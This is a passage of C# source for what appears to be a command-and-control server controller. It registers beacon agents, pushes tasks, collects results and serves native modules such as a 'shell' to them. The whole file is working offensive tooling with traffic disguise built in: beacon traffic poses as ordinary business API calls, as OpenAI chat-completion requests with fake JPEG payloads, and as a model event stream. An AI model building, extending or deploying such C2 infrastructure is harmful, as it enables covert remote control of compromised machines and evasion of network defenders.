using System.Text;
using System.Text.Json;
using Microsoft.AspNetCore.Mvc;
using Microsoft.Extensions.Options;
using LibraNextgen.Common.Models;
using LibraNextgen.Common.Profiles;
using LibraNextgen.Common.Protocol;
using LibraNextgen.Service.Configuration;
using LibraNextgen.Service.Profiles;
using LibraNextgen.Service.Services;

namespace LibraNextgen.Service.Controllers;

[ApiController]
[Route("api/beacon")]
public class AgentCommsController : ControllerBase
{
    internal static readonly string BuildsDir = ResolveBuildsDir();

    /// <summary>
    /// 构建产物目录：优先 LIBRA_BUILDS_DIR 环境变量（公网发布部署用绝对路径），
    /// 否则回退 dev 相对路径（bin/Debug/net10.0 上跳四级到仓库根 build-output）。
    /// </summary>
    private static string ResolveBuildsDir()
    {
        var env = Environment.GetEnvironmentVariable("LIBRA_BUILDS_DIR");
        if (!string.IsNullOrWhiteSpace(env))
            return Path.GetFullPath(env);
        return Path.GetFullPath(
            Path.Combine(AppContext.BaseDirectory, "..", "..", "..", "..", "build-output"));
    }

    private readonly AgentCommsService _commsService;
    private readonly AgentTrafficService _traffic;
    private readonly ConnectionManager _wsManager;
    private readonly BeaconSettings _beaconSettings;
    private static readonly System.Text.Json.JsonSerializerOptions JsonOpts = new(System.Text.Json.JsonSerializerDefaults.Web)
    {
        // 枚举必须输出 camelCase 字符串（agent 协议与 Rust serde 对齐）：
        // Rust 侧枚举带 rename_all="camelCase"（pending/completed/generic…），
        // 数字或 PascalCase 都会导致 AgentTask 反序列化失败。
        Converters = { new System.Text.Json.Serialization.JsonStringEnumConverter(System.Text.Json.JsonNamingPolicy.CamelCase) }
    };
    private static string J(object v) => System.Text.Json.JsonSerializer.Serialize(v, JsonOpts);
    private static T? D<T>(string s) => System.Text.Json.JsonSerializer.Deserialize<T>(s, JsonOpts);
    private readonly AgentService _agentService;
    private readonly AgentEventHub _eventHub;
    private readonly TaskService _taskService;

    public AgentCommsController(
        AgentCommsService commsService,
        AgentTrafficService traffic,
        ConnectionManager wsManager,
        IOptions<BeaconSettings> beaconSettings,
        AgentService agentService,
        AgentEventHub eventHub,
        TaskService taskService)
    {
        _commsService = commsService;
        _traffic = traffic;
        _wsManager = wsManager;
        _beaconSettings = beaconSettings.Value;
        _agentService = agentService;
        _eventHub = eventHub;
        _taskService = taskService;
    }

    [HttpPost("register")]
    public async Task<IActionResult> Register([FromBody] JsonElement? body)
    {
        // The registration handshake may be encrypted with a pre-session AES
        // key derived from the shared beacon secret (SHA-256). Decrypt first,
        // then treat the payload exactly like the legacy plaintext body.
        RegisterRequest? request = null;
        var encrypted = false;
        if (body is { } el && el.TryGetProperty("payload", out var p) && p.GetString() is string payload)
        {
            var secret = _beaconSettings.Secret;
            if (string.IsNullOrEmpty(secret))
                return BadRequest(new { error = "encrypted registration requires a configured beacon secret" });

            try
            {
                var plain = CryptoHelper.DecryptPayload(payload, CryptoHelper.DerivePreSessionKey(secret));
                request = JsonSerializer.Deserialize<RegisterRequest>(plain, new JsonSerializerOptions
                {
                    PropertyNameCaseInsensitive = true
                });
            }
            catch (Exception)
            {
                return Unauthorized(new { error = "registration decrypt failed" });
            }
            encrypted = true;
        }
        else if (body is { } plainEl)
        {
            try
            {
                request = plainEl.Deserialize<RegisterRequest>(new JsonSerializerOptions
                {
                    PropertyNameCaseInsensitive = true
                });
            }
            catch (JsonException)
            {
                return BadRequest(new { error = "invalid registration body" });
            }
        }

        if (request == null)
            return BadRequest(new { error = "invalid registration body" });

        if (string.IsNullOrWhiteSpace(request.Hostname))
            return BadRequest(new { error = "hostname required" });

        if (IsSecretRequired() && !IsSecretValid(request.BeaconSecret))
            return Unauthorized(new { error = "invalid beacon secret" });

        var bytesReceived = Request.ContentLength ?? 0;

        var clientIp = HttpContext.Connection.RemoteIpAddress?.ToString() ?? "unknown";
        var agent = await _commsService.HandleRegisterAsync(request, clientIp);

        if (agent == null)
            return StatusCode(500, new { error = "registration failed" });

        // Establish AES-256 session key (RSA-OAEP encrypted with the agent's public key).
        var sessionKey = _commsService.EstablishSessionKey(agent.Id, request.PublicKey, request.HasSessionKey);

        // Opaque per-session channel token: replaces the stable agent id on the
        // wire for all subsequent requests. Rotates on every registration.
        var sessionToken = _commsService.IssueSessionToken(agent.Id);

        var profile = await _commsService.GetActiveProfileAsync();
        var response = await BuildRegisterResponseAsync(agent, request, sessionKey, sessionToken, profile);

        var responseJson = J(response);
        var bytesSent = Encoding.UTF8.GetByteCount(responseJson);
        _traffic.Accumulate(agent.Id, agent.Hostname, bytesReceived, bytesSent);

        // Broadcast online status to console clients
        _ = BroadcastAgentOnlineAsync(agent.Id, agent.Hostname, clientIp);

        return Ok(response);
    }

    private async Task BroadcastAgentOnlineAsync(string agentId, string hostname, string ipAddress)
    {
        try
        {
            var msg = new WebSocketMessage
            {
                Type = "agent.status",
                Channel = agentId,
                Data = JsonSerializer.SerializeToElement(new { agentId, status = AgentStatus.Online.ToString() })
            };
            await _wsManager.BroadcastToConsoleAsync(msg);
            _wsManager.AppendEvent("agent", $"Agent {hostname} ({ipAddress}) 上线");
        }
        catch { /* best-effort */ }
    }

    // ══════════════════════════════════════════════════════════════════
    // 单入口内部路由（流量伪装 Phase 2）
    //
    // 所有 beacon 流量经 BeaconEntryMiddleware 重写到本端点：
    //   POST <entry_path>/<随机业务后缀>
    //   body = { dataKey: 密文, tsKey: ts, randKey: 随机, signKey: HMAC, tokenKey: sid }
    // 密文内是 BeaconEnvelope{op, id, data}，按 op 分发：
    //   reg=注册(预会话密钥) / hb=心跳 / res=结果 / mod=模块下载
    // ══════════════════════════════════════════════════════════════════

    [HttpPost("handle")]
    public async Task<IActionResult> Handle([FromBody] JsonElement? body)
    {
        if (body is not { } el)
            return BadRequest(new { error = "invalid body" });

        var profile = await _commsService.GetActiveProfileAsync();
        var (dataKey, tsKey, randKey, signKey, tokenKey) = TransformKeys(profile);

        // 1) 壳解析
        if (!el.TryGetProperty(dataKey, out var dProp) || dProp.GetString() is not string cipherB64)
            return BadRequest(new { error = "bad envelope" });
        var sid = el.TryGetProperty(tokenKey, out var sidProp) ? sidProp.GetString() : null;
        var tsStr = el.TryGetProperty(tsKey, out var tsProp) ? tsProp.ToString() : "";

        // 2) 假签名宽松校验（仅记录，不拒绝——避免 secret 更换导致失联）
        if (!string.IsNullOrEmpty(signKey) && el.TryGetProperty(signKey, out var sigProp) && sigProp.GetString() is string providedSign)
        {
            var secret = _beaconSettings.Secret;
            if (!string.IsNullOrEmpty(secret) && !string.IsNullOrEmpty(tsStr))
            {
                var expected = HmacHex(secret, $"{tsStr}|{cipherB64}");
                if (!string.Equals(expected, providedSign, StringComparison.OrdinalIgnoreCase))
                {
                    // HMAC 不匹配：宽松处理（记录）
                }
            }
        }

        // 3) 密钥选择：sid → 会话密钥；否则尝试预会话密钥（注册）
        byte[]? key = null;
        string? agentId = null;
        if (!string.IsNullOrEmpty(sid) &&
            _commsService.TryResolveSessionToken(sid, out var resolved) &&
            !string.IsNullOrEmpty(resolved))
        {
            agentId = resolved;
            _commsService.TryGetSessionKey(resolved, out key);
        }

        string plain;
        try
        {
            if (key != null)
            {
                plain = CryptoHelper.DecryptPayload(cipherB64, key);
            }
            else if (!string.IsNullOrEmpty(_beaconSettings.Secret))
            {
                plain = CryptoHelper.DecryptPayload(cipherB64, CryptoHelper.DerivePreSessionKey(_beaconSettings.Secret));
            }
            else
            {
                return Unauthorized(new { error = "no key available" });
            }
        }
        catch (Exception)
        {
            return Unauthorized(new { error = "decrypt failed" });
        }

        // 4) 信封解析（camelCase：op/id/data）
        BeaconEnvelope? env;
        try
        {
            env = JsonSerializer.Deserialize<BeaconEnvelope>(plain, new JsonSerializerOptions
            {
                PropertyNameCaseInsensitive = true
            });
        }
        catch (JsonException)
        {
            return BadRequest(new { error = "bad envelope" });
        }
        if (env == null || string.IsNullOrEmpty(env.Op))
            return BadRequest(new { error = "bad envelope" });

        var bytesReceived = Request.ContentLength ?? 0;

        // 5) 分发
        switch (env.Op)
        {
            case "reg":
                return await HandleRegAsync(env.Data, profile);

            case "hb":
                if (agentId == null || key == null)
                    return Unauthorized(new { error = "session not established" });
                return await HandleHbAsync(agentId, env.Data, key, bytesReceived, profile);

            case "res":
                if (agentId == null || key == null)
                    return Unauthorized(new { error = "session not established" });
                return await HandleResAsync(agentId, env.Data, key, bytesReceived, profile);

            case "mod":
                if (agentId == null || key == null)
                    return Unauthorized(new { error = "session not established" });
                return await HandleModAsync(agentId, env.Data, key, profile);

            default:
                return BadRequest(new { error = "unknown op" });
        }
    }

    /// AI 通道端点（v1/chat/completions 伪装）：请求体为 chat.completions 风格，
    /// 密文在 messages[0].content，会话标识在 user 字段（随机会话 token）。
    /// 响应为 text/event-stream，密文分块放在 delta.content，最后 [DONE]。
    [HttpPost("ai")]
    public async Task<IActionResult> AiChannel([FromBody] JsonElement? body)
    {
        if (body is not { } el)
            return BadRequest(new { error = "invalid body" });

        // 1) 解析 chat 请求
        if (!el.TryGetProperty("messages", out var messages) ||
            messages.ValueKind != JsonValueKind.Array ||
            messages.GetArrayLength() == 0)
        {
            return BadRequest(new { error = "invalid messages" });
        }
        var first = messages[0];
        if (!first.TryGetProperty("content", out var contentProp) || contentProp.GetString() is not string rawContent)
            return BadRequest(new { error = "invalid content" });
        // 伪装：content 以 data:image/jpeg;base64, 开头（AI 图片分析请求），剥前缀取密文
        var cipherB64 = rawContent;
        const string imagePrefix = "data:image/jpeg;base64,";
        if (rawContent.StartsWith(imagePrefix, StringComparison.OrdinalIgnoreCase))
            cipherB64 = rawContent[imagePrefix.Length..];
        var userId = el.TryGetProperty("user", out var userProp) ? userProp.GetString() : null;

        // 2) 密钥选择：user 字段（会话 token）→ 会话密钥；否则预会话密钥（注册）
        byte[]? key = null;
        string? agentId = null;
        if (!string.IsNullOrEmpty(userId) &&
            _commsService.TryResolveSessionToken(userId, out var resolved) &&
            !string.IsNullOrEmpty(resolved))
        {
            agentId = resolved;
            _commsService.TryGetSessionKey(resolved, out key);
        }

        string plain;
        try
        {
            if (key != null)
            {
                plain = CryptoHelper.DecryptPayload(cipherB64, key);
            }
            else if (!string.IsNullOrEmpty(_beaconSettings.Secret))
            {
                plain = CryptoHelper.DecryptPayload(cipherB64, CryptoHelper.DerivePreSessionKey(_beaconSettings.Secret));
            }
            else
            {
                return Unauthorized(new { error = "no key available" });
            }
        }
        catch (Exception)
        {
            return Unauthorized(new { error = "decrypt failed" });
        }

        // 3) 信封解析
        BeaconEnvelope? env;
        try
        {
            env = JsonSerializer.Deserialize<BeaconEnvelope>(plain, new JsonSerializerOptions
            {
                PropertyNameCaseInsensitive = true
            });
        }
        catch (JsonException)
        {
            return BadRequest(new { error = "bad envelope" });
        }
        if (env == null || string.IsNullOrEmpty(env.Op))
            return BadRequest(new { error = "bad envelope" });

        var bytesReceived = Request.ContentLength ?? 0;
        var profile = await _commsService.GetActiveProfileAsync();

        // 4) 分发 → 响应明文
        string? responsePlain = null;
        switch (env.Op)
        {
            case "reg":
            {
                // 注册走旧端点（明文/密文），AI 通道不承载注册
                return BadRequest(new { error = "register via beacon endpoint" });
            }
            case "hb":
            {
                if (agentId == null || key == null)
                    return Unauthorized(new { error = "session not established" });
                // 重放保护
                try
                {
                    using var hb = JsonDocument.Parse(env.Data);
                    if (hb.RootElement.TryGetProperty("ts", out var ts) && ts.TryGetInt64(out var ms))
                    {
                        var now = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds();
                        if (Math.Abs(now - ms) > 120_000)
                            return Unauthorized(new { error = "stale heartbeat" });
                    }
                }
                catch (JsonException)
                {
                    return BadRequest(new { error = "invalid payload" });
                }
                var (valid, task, hostname) = await _commsService.HandleHeartbeatAsync(agentId);
                if (!valid)
                    return NotFound(new { error = "agent not found" });
                responsePlain = J(new HeartbeatResponse { PendingTask = task });
                _commsService.RecordTraffic(agentId, hostname, bytesReceived, 0);
                break;
            }
            case "res":
            {
                if (agentId == null || key == null)
                    return Unauthorized(new { error = "session not established" });
                TaskResult? result;
                try
                {
                    result = D<TaskResult>(env.Data);
                }
                catch (JsonException)
                {
                    return BadRequest(new { error = "invalid payload" });
                }
                if (result == null)
                    return BadRequest(new { error = "invalid payload" });
                var ok = await _commsService.HandleResultAsync(agentId, result, bytesReceived, 0);
                if (!ok)
                    return NotFound(new { error = "invalid task" });
                responsePlain = J(new { status = "received" });
                break;
            }
            case "mod":
            {
                if (agentId == null || key == null)
                    return Unauthorized(new { error = "session not established" });
                string? name = null;
                try
                {
                    using var doc = JsonDocument.Parse(env.Data);
                    if (doc.RootElement.TryGetProperty("name", out var n))
                        name = n.GetString();
                }
                catch (JsonException)
                {
                    return BadRequest(new { error = "invalid payload" });
                }
                if (string.IsNullOrEmpty(name) || name.Any(c => !(char.IsAsciiLetterOrDigit(c) || c == '-' || c == '_')))
                    return BadRequest(new { error = "invalid module name" });

                var platform = await ResolveAgentPlatformAsync(agentId);
                if (platform == null)
                    return NotFound(new { error = "agent platform unknown" });

                var modulesDir = Path.Combine(BuildsDir, "modules", platform);
                var ext = platform.StartsWith("linux") ? "so" : "dll";
                var modulePath = Path.Combine(modulesDir, $"{name}.{ext}");
                if (!System.IO.File.Exists(modulePath))
                {
                    var legacy = Path.Combine(BuildsDir, "modules", $"{name}.{ext}");
                    if (System.IO.File.Exists(legacy))
                        modulePath = legacy;
                }
                if (!System.IO.File.Exists(modulePath))
                    return NotFound(new { error = "module not found" });

                var bytes = System.IO.File.ReadAllBytes(modulePath);
                // 密文内容为 base64 的模块二进制
                responsePlain = Convert.ToBase64String(bytes);
                break;
            }
            default:
                return BadRequest(new { error = "unknown op" });
        }

        if (responsePlain == null)
            return BadRequest(new { error = "no response" });

        // 5) SSE 响应：密文分块（≤60KB base64）放入 delta.content
        var encrypted = CryptoHelper.EncryptPayload(responsePlain, key!);
        var chunks = ChunkString(encrypted, 60 * 1024);
        var sb = new StringBuilder();
        var completionId = "chatcmpl-" + Guid.NewGuid().ToString("N")[..24];
        var model = profile is ConfigurableProfile cp2 && cp2.Config.AiModels.Count > 0
            ? cp2.Config.AiModels[Random.Shared.Next(cp2.Config.AiModels.Count)]
            : "gpt-4o-mini";
        var created = DateTimeOffset.UtcNow.ToUnixTimeSeconds();
        foreach (var chunk in chunks)
        {
            sb.Append("data: ")
              .Append(J(new
              {
                  id = completionId,
                  obj = "chat.completion.chunk",
                  created,
                  model,
                  choices = new[]
                  {
                      new { index = 0, delta = new { content = chunk }, finish_reason = (string?)null }
                  }
              }))
              .Append("\n\n");
        }
        sb.Append("data: [DONE]\n\n");
        return Content(sb.ToString(), "text/event-stream");
    }

    /// <summary>
    /// SSE 任务事件流（伪装为模型事件流：GET /api/v1/models/events?channel=，
    /// 由 BeaconEntryMiddleware 重写到本端点）。服务端挂起连接，任务到达时
    /// 主动推送（AES-GCM 加密信封：data: &lt;b64(nonce||tag||ct)&gt;），
    /// 30s 注释 keepalive。连接建立时先补发一次 pending 任务。
    /// agent 以此替代心跳轮询；心跳降为低频兜底。
    /// </summary>
    [HttpGet("/api/beacon/events")]
    public async Task Events(string? channel, CancellationToken ct)
    {
        if (string.IsNullOrEmpty(channel)
            || !_commsService.TryResolveSessionToken(channel, out var agentId)
            || string.IsNullOrEmpty(agentId)
            || !_commsService.TryGetSessionKey(agentId, out var key) || key is null)
        {
            Response.StatusCode = StatusCodes.Status401Unauthorized;
            return;
        }

        Response.Headers.ContentType = "text/event-stream";
        Response.Headers.CacheControl = "no-cache";
        Response.Headers.Connection = "keep-alive";

        var queue = _eventHub.Subscribe(agentId);
        var abort = HttpContext.RequestAborted;
        // SSE 通道流量计入统计（下行字节，连接结束时 flush）
        long sseBytesSent = 0;
        var hostname = (await _agentService.GetByIdAsync(agentId, abort))?.Hostname ?? "unknown";

        async Task WriteEvent(string op, object data)
        {
            var plain = J(new { op, data });
            var encrypted = CryptoHelper.EncryptPayload(plain, key);
            var line = $"data: {encrypted}\n\n";
            await Response.WriteAsync(line, abort);
            sseBytesSent += Encoding.UTF8.GetByteCount(line);
        }

        // 连接即同步：pending 任务（避免竞态，心跳兜底）
        try
        {
            var pending = await _taskService.GetNextPendingForAgentAsync(agentId, abort);
            if (pending != null)
                await WriteEvent("task", pending);
            await Response.Body.FlushAsync(abort);
        }
        catch
        {
            _eventHub.Unsubscribe(agentId);
            return;
        }

        try
        {
            while (!abort.IsCancellationRequested)
            {
                var readTask = queue.Reader.WaitToReadAsync(abort).AsTask();
                var pingTask = Task.Delay(TimeSpan.FromSeconds(30), abort);
                var done = await Task.WhenAny(readTask, pingTask);
                if (done == readTask)
                {
                    if (!queue.Reader.TryRead(out var ev))
                        break; // channel completed
                    await WriteEvent(ev.Op, ev.Data ?? new { });
                    await Response.Body.FlushAsync(abort);
                }
                else
                {
                    // keepalive 注释行：刷新代理（nginx proxy_read_timeout）空闲超时
                    const string ping = ": ping\n\n";
                    await Response.WriteAsync(ping, abort);
                    await Response.Body.FlushAsync(abort);
                    sseBytesSent += ping.Length;
                }
            }
        }
        catch (OperationCanceledException) { }
        catch (IOException) { }
        catch (ObjectDisposedException) { }
        finally
        {
            _eventHub.Unsubscribe(agentId);
            if (sseBytesSent > 0)
                _commsService.RecordTraffic(agentId, hostname, 0, sseBytesSent);
        }
    }

    private static IEnumerable<string> ChunkString(string s, int size)
    {
        for (var i = 0; i < s.Length; i += size)
            yield return s.Substring(i, Math.Min(size, s.Length - i));
    }

    private async Task<IActionResult> HandleRegAsync(string regData, IMalleableProfile profile)
    {
        RegisterRequest? request;
        try
        {
            request = JsonSerializer.Deserialize<RegisterRequest>(regData, new JsonSerializerOptions
            {
                PropertyNameCaseInsensitive = true
            });
        }
        catch (JsonException)
        {
            return BadRequest(new { error = "invalid registration data" });
        }
        if (request == null || string.IsNullOrWhiteSpace(request.Hostname))
            return BadRequest(new { error = "hostname required" });

        if (IsSecretRequired() && !IsSecretValid(request.BeaconSecret))
            return Unauthorized(new { error = "invalid beacon secret" });

        var clientIp = HttpContext.Connection.RemoteIpAddress?.ToString() ?? "unknown";
        var agent = await _commsService.HandleRegisterAsync(request, clientIp);
        if (agent == null)
            return StatusCode(500, new { error = "registration failed" });

        var sessionKey = _commsService.EstablishSessionKey(agent.Id, request.PublicKey, request.HasSessionKey);
        var sessionToken = _commsService.IssueSessionToken(agent.Id);

        var response = await BuildRegisterResponseAsync(agent, request, sessionKey, sessionToken, profile);
        _ = BroadcastAgentOnlineAsync(agent.Id, agent.Hostname, clientIp);
        return Ok(response);
    }

    private async Task<IActionResult> HandleHbAsync(
        string agentId, string hbData, byte[] key, long bytesReceived, IMalleableProfile profile)
    {
        // 重放保护：ts 与当前时间差 > 120s 拒绝
        try
        {
            using var hb = JsonDocument.Parse(hbData);
            if (hb.RootElement.TryGetProperty("ts", out var ts) && ts.TryGetInt64(out var ms))
            {
                var now = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds();
                if (Math.Abs(now - ms) > 120_000)
                    return Unauthorized(new { error = "stale heartbeat" });
            }
        }
        catch (JsonException)
        {
            return BadRequest(new { error = "invalid payload" });
        }

        var (valid, task, hostname) = await _commsService.HandleHeartbeatAsync(agentId);
        if (!valid)
            return NotFound(new { error = "agent not found" });

        var responseJson = J(new HeartbeatResponse { PendingTask = task });
        var encrypted = CryptoHelper.EncryptPayload(responseJson, key);
        var bytesSent = Encoding.UTF8.GetByteCount(encrypted);
        _commsService.RecordTraffic(agentId, hostname, bytesReceived, bytesSent);

        var (dataKey, _, _, _, _) = TransformKeys(profile);
        return Ok(new Dictionary<string, string> { [dataKey] = encrypted });
    }

    private async Task<IActionResult> HandleResAsync(
        string agentId, string resData, byte[] key, long bytesReceived, IMalleableProfile profile)
    {
        TaskResult? result;
        try
        {
            result = D<TaskResult>(resData);
        }
        catch (JsonException)
        {
            return BadRequest(new { error = "invalid payload" });
        }
        if (result == null)
            return BadRequest(new { error = "invalid payload" });

        var responseJson = J(new { status = "received" });
        var bytesSent = Encoding.UTF8.GetByteCount(responseJson);
        var success = await _commsService.HandleResultAsync(agentId, result, bytesReceived, bytesSent);
        if (!success)
            return NotFound(new { error = "invalid task" });

        return Ok(new { status = "received" });
    }

    private async Task<IActionResult> HandleModAsync(
        string agentId, string modData, byte[] key, IMalleableProfile profile)
    {
        string? name = null;
        try
        {
            using var doc = JsonDocument.Parse(modData);
            if (doc.RootElement.TryGetProperty("name", out var n))
                name = n.GetString();
        }
        catch (JsonException)
        {
            return BadRequest(new { error = "invalid payload" });
        }
        if (string.IsNullOrEmpty(name) || name.Any(c => !(char.IsAsciiLetterOrDigit(c) || c == '-' || c == '_')))
            return BadRequest(new { error = "invalid module name" });

        var platform = await ResolveAgentPlatformAsync(agentId);
        if (platform == null)
            return NotFound(new { error = "agent platform unknown" });

        var modulesDir = Path.Combine(BuildsDir, "modules", platform);
        var ext = platform.StartsWith("linux") ? "so" : "dll";
        var modulePath = Path.Combine(modulesDir, $"{name}.{ext}");
        if (!System.IO.File.Exists(modulePath))
        {
            var legacy = Path.Combine(BuildsDir, "modules", $"{name}.{ext}");
            if (System.IO.File.Exists(legacy))
                modulePath = legacy;
        }
        if (!System.IO.File.Exists(modulePath))
            return NotFound(new { error = "module not found" });

        var bytes = System.IO.File.ReadAllBytes(modulePath);
        // 响应壳：密文内容为 base64 的模块二进制
        var encrypted = CryptoHelper.EncryptPayload(Convert.ToBase64String(bytes), key);
        var (dataKey, _, _, _, _) = TransformKeys(profile);
        return Ok(new Dictionary<string, string> { [dataKey] = encrypted });
    }

    private async Task<object> BuildRegisterResponseAsync(
        Agent agent, RegisterRequest request, string? sessionKey, string sessionToken, IMalleableProfile profile)
    {
        return new
        {
            agent_id = agent.Id,
            session_key = sessionKey,
            session_token = sessionToken,
            heartbeat_url = profile.GetHeartbeatUrl("/api/beacon"),
            result_url = profile.GetResultUrl("/api/beacon"),
            ws_url = profile.GetWebSocketUrl(""),
            heartbeat_interval = profile.HeartbeatIntervalSeconds,
            jitter = profile.JitterPercent,
            heartbeat_interval_ms = profile.HeartbeatIntervalSeconds * 1000,
            jitter_percent = profile.JitterPercent,
            profile = BuildTransformJson(profile)
        };
    }

    private static (string dataKey, string tsKey, string randKey, string signKey, string tokenKey) TransformKeys(
        IMalleableProfile profile)
    {
        if (profile is ConfigurableProfile cp)
        {
            var c = cp.Config;
            return (c.DataKey, c.TsKey, c.RandKey, c.SignKey, c.TokenKey);
        }
        return ("d", "ts", "r", "sign", "sid");
    }

    private static object BuildTransformJson(IMalleableProfile profile)
    {
        if (profile is ConfigurableProfile cp)
        {
            var c = cp.Config;
            return new
            {
                entryPath = c.EntryPath,
                pathSuffixes = c.PathSuffixes,
                dataKey = c.DataKey,
                tsKey = c.TsKey,
                randKey = c.RandKey,
                signKey = c.SignKey,
                tokenKey = c.TokenKey,
                userAgents = c.UserAgents,
                paddingMin = c.PaddingMin,
                paddingMax = c.PaddingMax,
                heartbeatIntervalMs = c.HeartbeatIntervalSeconds * 1000,
                jitterPercent = c.JitterPercent,
                aiPath = c.AiPath,
                aiModels = c.AiModels,
                authPrefix = c.AuthPrefix
            };
        }
        // DefaultProfile 固定值
        return new
        {
            entryPath = "/api",
            pathSuffixes = new[] { "user/info", "orders/list", "profile", "settings", "notifications", "messages/unread" },
            dataKey = "d",
            tsKey = "ts",
            randKey = "r",
            signKey = "sign",
            tokenKey = "sid",
            userAgents = Array.Empty<string>(),
            paddingMin = 0,
            paddingMax = 64,
            heartbeatIntervalMs = 10000,
            jitterPercent = 0.2,
            aiPath = "/v1/chat/completions",
            aiModels = new[] { "gpt-4o-mini", "gpt-4o", "gpt-4.1-mini" },
            authPrefix = "sk-"
        };
    }

    private static string HmacHex(string secret, string msg)
    {
        using var hmac = new System.Security.Cryptography.HMACSHA256(Encoding.UTF8.GetBytes(secret));
        var hash = hmac.ComputeHash(Encoding.UTF8.GetBytes(msg));
        return Convert.ToHexString(hash).ToLowerInvariant();
    }

    [HttpPost("heartbeat")]
    public async Task<IActionResult> Heartbeat([FromBody] JsonElement? body)
    {
        var agentId = ResolveAgentId(Request);
        if (string.IsNullOrEmpty(agentId))
            return BadRequest(new { error = "missing agent id" });

        var bytesReceived = Request.ContentLength ?? 0;

        // Authenticate + decrypt the heartbeat payload with the session key.
        if (!_commsService.TryGetSessionKey(agentId, out var key) || key is null)
            return Unauthorized(new { error = "session not established" });

        if (body is not { } el || !el.TryGetProperty("payload", out var p) || p.GetString() is not string payload)
            return BadRequest(new { error = "missing payload" });

        string heartbeatJson;
        try
        {
            heartbeatJson = CryptoHelper.DecryptPayload(payload, key);
        }
        catch (Exception)
        {
            return Unauthorized(new { error = "decrypt failed" });
        }

        // Replay protection: reject heartbeats whose timestamp is too far from now.
        try
        {
            using var hb = JsonDocument.Parse(heartbeatJson);
            if (hb.RootElement.TryGetProperty("ts", out var ts) && ts.TryGetInt64(out var ms))
            {
                var now = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds();
                if (Math.Abs(now - ms) > 120_000)
                    return Unauthorized(new { error = "stale heartbeat" });
            }
        }
        catch (JsonException)
        {
            return BadRequest(new { error = "invalid payload" });
        }

        var (valid, task, hostname) = await _commsService.HandleHeartbeatAsync(agentId);
        if (!valid)
            return NotFound(new { error = "agent not found" });

        var response = new HeartbeatResponse { PendingTask = task };
        var responseJson = J(response);

        // Encrypt the response with the session key.
        var encryptedResponse = CryptoHelper.EncryptPayload(responseJson, key);
        var bytesSent = Encoding.UTF8.GetByteCount(encryptedResponse);

        _commsService.RecordTraffic(agentId, hostname, bytesReceived, bytesSent);

        return Ok(new { payload = encryptedResponse });
    }

    [HttpPost("result")]
    public async Task<IActionResult> SubmitResult([FromBody] JsonElement? body)
    {
        var agentId = ResolveAgentId(Request);
        if (string.IsNullOrEmpty(agentId))
            return BadRequest(new { error = "missing agent id" });

        var bytesReceived = Request.ContentLength ?? 0;

        if (!_commsService.TryGetSessionKey(agentId, out var key) || key is null)
            return Unauthorized(new { error = "session not established" });

        if (body is not { } el || !el.TryGetProperty("payload", out var p) || p.GetString() is not string payload)
            return BadRequest(new { error = "missing payload" });

        TaskResult? result;
        try
        {
            var plain = CryptoHelper.DecryptPayload(payload, key);
            result = D<TaskResult>(plain);
        }
        catch (Exception)
        {
            return Unauthorized(new { error = "decrypt failed" });
        }

        if (result is null)
            return BadRequest(new { error = "invalid payload" });

        var responseJson = J(new { status = "received" });
        var bytesSent = Encoding.UTF8.GetByteCount(responseJson);
        var success = await _commsService.HandleResultAsync(agentId, result, bytesReceived, bytesSent);
        if (!success)
            return NotFound(new { error = "invalid task" });

        return Ok(new { status = "received" });
    }

    /// <summary>
    /// Serve a cloud module to an authenticated agent via an encrypted envelope.
    /// The request is `{ "payload": AES-GCM({"name":"shell"}) }` so no module
    /// name appears in plaintext. The module binary is encrypted with the
    /// agent's session key on the fly.
    /// </summary>
    [HttpPost("module")]
    public async Task<IActionResult> DownloadModuleEnvelope([FromBody] JsonElement? body)
    {
        var agentId = ResolveAgentId(Request);
        if (string.IsNullOrEmpty(agentId))
            return BadRequest(new { error = "missing agent id" });

        if (!_commsService.TryGetSessionKey(agentId, out var key) || key is null)
            return Unauthorized(new { error = "session not established" });

        if (body is not { } el || !el.TryGetProperty("payload", out var p) || p.GetString() is not string payload)
            return BadRequest(new { error = "missing payload" });

        string requestJson;
        try
        {
            requestJson = CryptoHelper.DecryptPayload(payload, key);
        }
        catch (Exception)
        {
            return Unauthorized(new { error = "decrypt failed" });
        }

        string? name = null;
        try
        {
            using var doc = JsonDocument.Parse(requestJson);
            if (doc.RootElement.TryGetProperty("name", out var n))
                name = n.GetString();
        }
        catch (JsonException)
        {
            return BadRequest(new { error = "invalid payload" });
        }

        if (string.IsNullOrEmpty(name) || name.Any(c => !(char.IsAsciiLetterOrDigit(c) || c == '-' || c == '_')))
            return BadRequest(new { error = "invalid module name" });

        return await ServeModuleAsync(agentId, name, key);
    }

    /// <summary>
    /// Serve a cloud module (e.g. "shell") to an authenticated agent. The module
    /// binary is encrypted with the agent's session key on the fly. Modules are
    /// resolved from the platform directory matching the agent's own platform.
    /// Legacy GET form — superseded by the encrypted POST envelope.
    /// </summary>
    [HttpGet("module/{name}")]
    public async Task<IActionResult> DownloadModule(string name)
    {
        var agentId = ResolveAgentId(Request);
        if (string.IsNullOrEmpty(agentId))
            return BadRequest(new { error = "missing agent id" });

        if (!_commsService.TryGetSessionKey(agentId, out var key) || key is null)
            return Unauthorized(new { error = "session not established" });

        if (string.IsNullOrEmpty(name) || name.Any(c => !(char.IsAsciiLetterOrDigit(c) || c == '-' || c == '_')))
            return BadRequest(new { error = "invalid module name" });

        return await ServeModuleAsync(agentId, name, key);
    }

    private async Task<IActionResult> ServeModuleAsync(string agentId, string name, byte[] key)
    {
        // Resolve the agent's platform so the correct artifact set is served.
        var platform = await ResolveAgentPlatformAsync(agentId);
        if (platform == null)
            return NotFound(new { error = "agent platform unknown" });

        var modulesDir = Path.Combine(BuildsDir, "modules", platform);
        var ext = platform.StartsWith("linux") ? "so" : "dll";
        var modulePath = Path.Combine(modulesDir, $"{name}.{ext}");
        if (!System.IO.File.Exists(modulePath))
        {
            // Backward compat: pre-platform-scoped builds deployed modules
            // directly under build-output/modules/.
            var legacy = Path.Combine(BuildsDir, "modules", $"{name}.{ext}");
            if (System.IO.File.Exists(legacy))
                modulePath = legacy;
        }
        if (!System.IO.File.Exists(modulePath))
            return NotFound(new { error = "module not found" });

        var bytes = System.IO.File.ReadAllBytes(modulePath);
        var payload = CryptoHelper.EncryptBytes(bytes, key);
        return Ok(new { payload });
    }

    /// <summary>
    /// Resolve the beacon's identity: prefer the opaque per-session channel
    /// token (`X-Request-Id`), fall back to the legacy stable agent id
    /// (`X-Agent-Id`) for pre-token agents.
    /// </summary>
